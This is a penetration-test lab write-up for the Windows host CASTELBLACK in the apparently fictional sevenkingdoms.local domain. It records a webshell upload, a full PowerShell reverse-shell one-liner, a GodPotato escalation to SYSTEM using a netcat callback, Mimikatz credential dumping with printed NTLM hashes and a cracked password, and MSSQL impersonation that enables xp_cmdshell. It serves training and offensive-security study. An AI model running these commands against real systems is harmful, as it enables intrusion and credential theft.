@@ -1,0 +1,566 @@
+---
+title: "castleblack.north"
+---
+
+# Enumeration
+
+<Note>
+  Document all enumeration don on the host to find vulnerable and attack paths
+</Note>
+
+```shellscript
+nmap -sCV 10.10.10.22 -oA nmapscan
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-01 11:15 EDT
+Nmap scan report for 10.10.10.22
+Host is up (0.00090s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ssl-date: 2025-11-01T15:16:00+00:00; -1s from scanner time.
+|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-11-01T14:38:43
+|_Not valid after:  2055-11-01T14:38:43
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-11-01T15:16:00+00:00; -1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: NORTH
+|   NetBIOS_Domain_Name: NORTH
+|   NetBIOS_Computer_Name: CASTELBLACK
+|   DNS_Domain_Name: north.sevenkingdoms.local
+|   DNS_Computer_Name: castelblack.north.sevenkingdoms.local
+|   DNS_Tree_Name: sevenkingdoms.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-11-01T15:15:55+00:00
+| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local
+| Not valid before: 2025-10-17T19:20:10
+|_Not valid after:  2026-04-18T19:20:10
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-11-01T15:15:55
+|_  start_date: N/A
+|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:65:b7:c5 (VMware)
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.59 seconds
+```
+
+### Option One: Webshell Upload vulnerability on Port 80
+
+I tried so hard looking for an `aspx webshel`l that would give me RCE from the URL, and I found it.
+
+<iframe src="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx" height="300" width="700" title="GodPotato" />
+
+Save this as cmd.aspx locally and upload into the upload page
+
+![Image](/images/image-9.png "Image")
+
+Try navigating to [http://10.10.10.22/upload/cmd.aspx](http://10.10.10.22/upload/cmd.aspx). I have have RCE on the Windows Server
+
+![Image](/images/image-10.png "Image")
+
+## Option 2:
+
+### SMB Enumeration:
+
+```text
+nxc smb 10.10.10.22 -u 'a' -p '' --shares                                                                                                                  
+SMB         10.10.10.22     445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:None)
+SMB         10.10.10.22     445    CASTELBLACK      [+] north.sevenkingdoms.local\a: (Guest)
+SMB         10.10.10.22     445    CASTELBLACK      [*] Enumerated shares
+SMB         10.10.10.22     445    CASTELBLACK      Share           Permissions     Remark
+SMB         10.10.10.22     445    CASTELBLACK      -----           -----------     ------
+SMB         10.10.10.22     445    CASTELBLACK      ADMIN$                          Remote Admin
+SMB         10.10.10.22     445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
+SMB         10.10.10.22     445    CASTELBLACK      C$                              Default share
+SMB         10.10.10.22     445    CASTELBLACK      IPC$            READ            Remote IPC
+SMB         10.10.10.22     445    CASTELBLACK      public                          Basic Read share for all domain users
+```
+
+## **Foothold**
+
+Research findings, data insights, and key considerations and document how you got a foothold on the vulnerable box
+
+With that I can now craft a Powershell Reverse Shell and get a callback to my local machine. Copy and paste the Rev shell into the Arguments block and start a netcat listener.
+
+```text wrap
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.128',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+![Image](/images/image-11.png "Image")
+
+Checking the system’s privileges I found a vulnerability I could use to get to `nt system\authority`
+
+The `SeImpersonatePrivilege`:
+
+SeImpersonatePrivilege is a Windows security setting that allows a program to impersonate a user after authentication, enabling it to act on behalf of that user. This privilege is often used in services and applications to manage user permissions securely.
+
+```text
+PS C:\inetpub> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\inetpub> dir
+```
+
+# Privilege Escalation
+
+Document how you were able to more laterally and gain a higher privilege.
+
+### God Potato
+
+Since the program has SeImpersonatePrivilege I can use GodPotato to get to `NT AUTHORITY\SYSTEM`
+
+<iframe src="https://github.com/BeichenDream/GodPotato" height="300" width="900" title="GodPotato" />
+
+If the compromised system doesn’t have ncat. Download it locally before sending it over to the compromised machine.
+
+<iframe src="https://github.com/vinsworldcom/NetCat64" height="300" width="900" title="NetCat64" />
+
+Using the python weburl I was able to download both files to the Windows machine.
+
+```text
+python3 -m http.server 8080 
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.10.22 - - [01/Nov/2025 16:23:14] "GET /GodPotato-NET2.exe HTTP/1.1" 200 -
+10.10.10.22 - - [01/Nov/2025 16:39:37] "GET /nc64.exe HTTP/1.1" 200 -
+```
+
+To get a Reverse shell back I ran the below commands
+
+```text
+C:\Windows\Temp> .\GodPotato-NET2.exe -cmd "nc64 -t -e C:\Windows\System32\cmd.exe 10.10.10.128 4449"
+```
+
+```text
+nc -lvp 4449
+Listening on 0.0.0.0 4449
+
+Connection received on 10.10.10.22 49885
+Microsoft Windows [Version 10.0.17763.7922]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\Temp>
+C:\Windows\Temp>whoami
+whoami
+nt authority\system
+```
+
+### Mimikatz
+
+Same thing with GodPotato, I uploaded from the attacker machine to the compromised windows box.
+
+```text
+-m http.server 8080 
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.10.22 - - [01/Nov/2025 16:55:09] "GET /mimikatz.exe HTTP/1.1" 200 -
+```
+
+Ran Mimikatz to dump all the User’s password
+
+```text
+C:\Windows\Temp>.\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+```
+
+I got robb.stark NTLM password
+
+```text
+User Name         : robb.stark
+Domain            : NORTH
+Logon Server      : WINTERFELL
+Logon Time        : 11/1/2025 9:45:23 AM
+SID               : S-1-5-21-928725054-1381016483-1750705438-1113
+	msv :	
+	 [00000003] Primary
+	 * Username : robb.stark
+	 * Domain   : NORTH
+	 * NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
+```
+
+And sql\_svc NTLM password
+
+```text
+User Name         : sql_svc
+Domain            : NORTH
+Logon Server      : WINTERFELL
+Logon Time        : 11/1/2025 9:45:11 AM
+SID               : S-1-5-21-928725054-1381016483-1750705438-1121
+	msv :	
+	 [00000003] Primary
+	 * Username : sql_svc
+	 * Domain   : NORTH
+	 * NTLM     : 84a5092f53390ea48d660be52b93b804
+```
+
+### Cracking NTLM Hashes with John
+
+I was able to crack `robb.stark` password.
+
+```text
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT winterfell-users-hashes.txt 
+Using default input encoding: UTF-8
+Loaded 3 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sexywolfy        (robb.stark)     
+1g 0:00:00:00 DONE (2025-11-01 17:13) 1.851g/s 26562Kp/s 26562Kc/s 55529KC/s  _ 09..*7¡Vamos!
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+
+# Creds found
+robb.stark:sexywolfy
+```
+
+I can now use the creds to do a RDP to the Windows machine.
+
+![Image](/images/image-12.png "Image")
+
+I found a running MySQL instance running in the conpromised Windows host.
+
+I will use `PowerUpSQL` to enumerate further.
+
+![Image](/images/image-13.png "Image")
+
+![Image](/images/image-14.png "Image")
+
+# MSSQL
+
+## Get Users SPN
+
+```text
+impacket-GetUserSPNs north.sevenkingdoms.local/samwell.tarly:Heartsbane                                                                                                                       
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName                                 Name         MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
+---------------------------------------------------  -----------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
+HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local        2025-10-31 19:47:28.970073  <never>                                 
+CIFS/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-10-31 19:47:37.296408  <never>                     constrained 
+HTTP/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-10-31 19:47:37.296408  <never>                     constrained 
+MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                                  2025-10-31 19:47:43.438914  2025-12-27 15:08:17.311154              
+MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                                  2025-10-31 19:47:43.438914  2025-12-27 15:08:17.311154              
+```
+
+Login to mssqlclient using impacket
+
+```text
+impacket-mssqlclient samwell.tarly@10.10.10.22 -windows-auth                                                                                                                                  
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(CASTELBLACK\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(CASTELBLACK\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (NORTH\samwell.tarly  guest@master)>
+```
+
+### Enumerate MssqlClient
+
+**Enumerate Database**
+
+```text
+SQL (NORTH\robb.stark  guest@master)> enum_db
+name     is_trustworthy_on   
+------   -----------------   
+master                   0   
+tempdb                   0   
+model                    0   
+msdb                     1 
+```
+
+**Enumerate Users**
+
+```text
+SQL (NORTH\samwell.tarly  guest@master)> enum_users
+UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
+------------------   --------   ---------   ---------   -------------   ----------   -----   
+dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
+guest                public     NULL        NULL        guest           b'2         '   b'00'   
+INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
+sys                  public     NULL        NULL        NULL            b'4         '    NULL   
+```
+
+**Enumerate logins**
+
+```text
+SQL (NORTH\samwell.tarly  guest@master)> enum_logins
+name                  type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+-------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                    SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
+BUILTIN\Users         WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
+NORTH\samwell.tarly   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+```
+
+**Enumerate Impersonate.**
+
+Meaning `Samwell Tarly` can impersonate the `sa` db owner via `LOGIN`
+
+```text
+SQL (NORTH\samwell.tarly  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee               grantor   
+----------   --------   ---------------   ----------   -------------------   -------   
+b'LOGIN'     b''        IMPERSONATE       GRANT        NORTH\samwell.tarly   sa 
+```
+
+```text
+SQL (NORTH\samwell.tarly  guest@master)> exec_as_login sa
+SQL (sa  dbo@master)> enable_xp_cmdshell
+INFO(CASTELBLACK\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(CASTELBLACK\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@master)> RECONFIGURE
+SQL (sa  dbo@master)> xp_cmdshell whoami
+output          
+-------------   
+north\sql_svc   
+NULL            
+
+
+SQL (sa  dbo@master)> enum_users
+UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID   
+---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------   
+##MS_AgentSigningCertificate##      public     ##MS_AgentSigningCertificate##      master      NULL            b'6         '   b'0106000000000009010000004c1967c27feb2ead332894c5a0779eae202847c8'   
+##MS_PolicyEventProcessingLogin##   public     ##MS_PolicyEventProcessingLogin##   master      dbo             b'5         '                                   b'5681cce7a1f1ff41b2f95ced7d792e70'   
+dbo                                 db_owner   sa                                  master      dbo             b'1         '                                                                 b'01'   
+guest                               public     NULL                                NULL        guest           b'2         '                                                                 b'00'   
+INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b'3         '                                                                  NULL   
+NORTH\arya.stark                    public     NULL                                NULL        dbo             b'7         '           b'0105000000000005150000003e385b37a3a350521ea5596856040000'   
+sys                                 public     NULL                                NULL        NULL            b'4         '                                                                  NULL   
+
+
+SQL (sa  dbo@master)> enum_logins
+name                                 type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+----------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                                   SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
+##MS_PolicyEventProcessingLogin##    SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+##MS_PolicyTsqlExecutionLogin##      SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+NORTH\sql_svc                        WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\SQLWriter                 WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\Winmgmt                   WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\MSSQL$SQLEXPRESS          WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+CASTELBLACK\vagrant                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+BUILTIN\Users                        WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
+NT AUTHORITY\SYSTEM                  WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+NT SERVICE\SQLTELEMETRY$SQLEXPRESS   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+NORTH\jon.snow                       WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NORTH\samwell.tarly                  WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+NORTH\brandon.stark                  WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+SQL (sa  dbo@master)> 
+```
+
+`jon.snow` and `sql_svc` do have `WINDOWS_LOGIN` and are both `sysadmin`
+
+I can also try to impersonate others as the `sa`. So I have impersonate `jon.snow` if I login as `brandon.stark`
+
+```text
+SQL (sa  dbo@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee               grantor                        
+----------   --------   ---------------   ----------   -------------------   ----------------------------   
+b'USER'      master     IMPERSONATE       GRANT        NORTH\arya.stark      dbo                            
+b'USER'      msdb       IMPERSONATE       GRANT        NORTH\arya.stark      dbo                            
+b'USER'      msdb       IMPERSONATE       GRANT        dc_admin              MS_DataCollectorInternalUser   
+b'LOGIN'     b''        IMPERSONATE       GRANT        NORTH\samwell.tarly   sa                             
+b'LOGIN'     b''        IMPERSONATE       GRANT        NORTH\brandon.stark   NORTH\jon.snow 
+```
+
+`Try Arya Stark`
+
+```text
+impacket-mssqlclient arya.stark@10.10.10.22 -windows-auth                                                                                                                                     ─╯
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(CASTELBLACK\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(CASTELBLACK\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
+[!] Press help for extra shell commands
+SQL (NORTH\arya.stark  NORTH\arya.stark@master)> enum_db
+name     is_trustworthy_on   
+------   -----------------   
+master                   0   
+tempdb                   0   
+model                    0   
+msdb                     1 
+  
+SQL (NORTH\arya.stark  NORTH\arya.stark@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee            grantor   
+----------   --------   ---------------   ----------   ----------------   -------   
+b'USER'      master     IMPERSONATE       GRANT        NORTH\arya.stark   dbo       
+b'USER'      msdb       IMPERSONATE       GRANT        NORTH\arya.stark   dbo  
+
+     
+SQL (NORTH\arya.stark  NORTH\arya.stark@master)> use msdb
+ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
+INFO(CASTELBLACK\SQLEXPRESS): Line 1: Changed database context to 'msdb'.
+
+
+SQL (NORTH\arya.stark  NORTH\arya.stark@msdb)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee            grantor   
+----------   --------   ---------------   ----------   ----------------   -------   
+b'USER'      master     IMPERSONATE       GRANT        NORTH\arya.stark   dbo       
+b'USER'      msdb       IMPERSONATE       GRANT        NORTH\arya.stark   dbo       
+
+           
+SQL (NORTH\arya.stark  NORTH\arya.stark@msdb)> exec_as_user dbo
+
+SQL (sa  dbo@msdb)> enable_xp_cmdshell
+INFO(CASTELBLACK\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(CASTELBLACK\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@msdb)> RECONFIGURE
+
+SQL (sa  dbo@msdb)> xp_cmdshell whoami
+output          
+-------------   
+north\sql_svc   
+NULL 
+           
+SQL (sa  dbo@msdb)> enum_logins
+name                                 type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+----------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                                   SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
+##MS_PolicyEventProcessingLogin##    SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+##MS_PolicyTsqlExecutionLogin##      SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+NORTH\sql_svc                        WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\SQLWriter                 WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\Winmgmt                   WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NT SERVICE\MSSQL$SQLEXPRESS          WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+CASTELBLACK\vagrant                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+BUILTIN\Users                        WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
+NT AUTHORITY\SYSTEM                  WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+NT SERVICE\SQLTELEMETRY$SQLEXPRESS   WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+NORTH\jon.snow                       WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+NORTH\samwell.tarly                  WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+NORTH\brandon.stark                  WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+
+
+SQL (sa  dbo@msdb)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee               grantor                        
+----------   --------   ---------------   ----------   -------------------   ----------------------------   
+b'USER'      master     IMPERSONATE       GRANT        NORTH\arya.stark      dbo                            
+b'USER'      msdb       IMPERSONATE       GRANT        NORTH\arya.stark      dbo                            
+b'USER'      msdb       IMPERSONATE       GRANT        dc_admin              MS_DataCollectorInternalUser   
+b'LOGIN'     b''        IMPERSONATE       GRANT        NORTH\samwell.tarly   sa                             
+b'LOGIN'     b''        IMPERSONATE       GRANT        NORTH\brandon.stark   NORTH\jon.snow                 
+SQL (sa  dbo@msdb)> 
+```
+
+#### **Enumerate Using NXC**
+
+```text
+nxc mssql 10.10.10.22 -u samwell.tarly -p 'Heartsbane'                                                                                                                                        ─╯
+MSSQL       10.10.10.22     1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+MSSQL       10.10.10.22     1433   CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+
+nxc mssql 10.10.10.22 -u samwell.tarly -p 'Heartsbane' -M mssql_priv                                                                                                                          ─╯
+MSSQL       10.10.10.22     1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+MSSQL       10.10.10.22     1433   CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+MSSQL_PRIV  10.10.10.22     1433   CASTELBLACK      [+] NORTH\samwell.tarly can impersonate: sa (sysadmin)
+
+nxc mssql 10.10.10.22 -u samwell.tarly -p 'Heartsbane' -M mssql_priv -o ACTION=privesc                                                                                                        ─╯
+MSSQL       10.10.10.22     1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+MSSQL       10.10.10.22     1433   CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+MSSQL_PRIV  10.10.10.22     1433   CASTELBLACK      [+] NORTH\samwell.tarly can impersonate: sa (sysadmin)
+MSSQL_PRIV  10.10.10.22     1433   CASTELBLACK      [+] NORTH\samwell.tarly is now a sysadmin! (Pwn3d!)
+```
+
+`Run Commands` as SA
+
+```text
+nxc mssql 10.10.10.22 -u samwell.tarly -p 'Heartsbane' -x whoami                                                                                                                              ─╯
+MSSQL       10.10.10.22     1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+MSSQL       10.10.10.22     1433   CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane (Pwn3d!)
+MSSQL       10.10.10.22     1433   CASTELBLACK      [+] Executed command via mssqlexec
+MSSQL       10.10.10.22     1433   CASTELBLACK      north\sql_svc
+```
+
+#### **Enumerate RID using Elevated permissions**
+
+```text
+nxc mssql 10.10.10.22 -u samwell.tarly -p 'Heartsbane' --rid-brute                                                                                                                            ─╯
+MSSQL       10.10.10.22     1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local)
+MSSQL       10.10.10.22     1433   CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane (Pwn3d!)
+MSSQL       10.10.10.22     1433   CASTELBLACK      500: NORTH\Administrator
+MSSQL       10.10.10.22     1433   CASTELBLACK      501: NORTH\Guest
+MSSQL       10.10.10.22     1433   CASTELBLACK      502: NORTH\krbtgt
+MSSQL       10.10.10.22     1433   CASTELBLACK      512: NORTH\Domain Admins
+MSSQL       10.10.10.22     1433   CASTELBLACK      513: NORTH\Domain Users
+MSSQL       10.10.10.22     1433   CASTELBLACK      514: NORTH\Domain Guests
+MSSQL       10.10.10.22     1433   CASTELBLACK      515: NORTH\Domain Computers
+MSSQL       10.10.10.22     1433   CASTELBLACK      516: NORTH\Domain Controllers
+MSSQL       10.10.10.22     1433   CASTELBLACK      517: NORTH\Cert Publishers
+MSSQL       10.10.10.22     1433   CASTELBLACK      520: NORTH\Group Policy Creator Owners
+MSSQL       10.10.10.22     1433   CASTELBLACK      521: NORTH\Read-only Domain Controllers
+MSSQL       10.10.10.22     1433   CASTELBLACK      522: NORTH\Cloneable Domain Controllers
+MSSQL       10.10.10.22     1433   CASTELBLACK      525: NORTH\Protected Users
+MSSQL       10.10.10.22     1433   CASTELBLACK      526: NORTH\Key Admins
+MSSQL       10.10.10.22     1433   CASTELBLACK      553: NORTH\RAS and IAS Servers
+MSSQL       10.10.10.22     1433   CASTELBLACK      571: NORTH\Allowed RODC Password Replication Group
+MSSQL       10.10.10.22     1433   CASTELBLACK      572: NORTH\Denied RODC Password Replication Group
+MSSQL       10.10.10.22     1433   CASTELBLACK      1000: NORTH\vagrant
+MSSQL       10.10.10.22     1433   CASTELBLACK      1001: NORTH\WINTERFELL$
+MSSQL       10.10.10.22     1433   CASTELBLACK      1102: NORTH\DnsAdmins
+MSSQL       10.10.10.22     1433   CASTELBLACK      1103: NORTH\DnsUpdateProxy
+MSSQL       10.10.10.22     1433   CASTELBLACK      1104: NORTH\SEVENKINGDOMS$
+MSSQL       10.10.10.22     1433   CASTELBLACK      1105: NORTH\CASTELBLACK$
+MSSQL       10.10.10.22     1433   CASTELBLACK      1106: NORTH\Stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1107: NORTH\Night Watch
+MSSQL       10.10.10.22     1433   CASTELBLACK      1108: NORTH\Mormont
+MSSQL       10.10.10.22     1433   CASTELBLACK      1109: NORTH\AcrossTheSea
+MSSQL       10.10.10.22     1433   CASTELBLACK      1110: NORTH\arya.stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1111: NORTH\eddard.stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1112: NORTH\catelyn.stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1113: NORTH\robb.stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1114: NORTH\sansa.stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1115: NORTH\brandon.stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1116: NORTH\rickon.stark
+MSSQL       10.10.10.22     1433   CASTELBLACK      1117: NORTH\hodor
+MSSQL       10.10.10.22     1433   CASTELBLACK      1118: NORTH\jon.snow
+MSSQL       10.10.10.22     1433   CASTELBLACK      1119: NORTH\samwell.tarly
+MSSQL       10.10.10.22     1433   CASTELBLACK      1120: NORTH\jeor.mormont
+MSSQL       10.10.10.22     1433   CASTELBLACK      1121: NORTH\sql_svc
+```
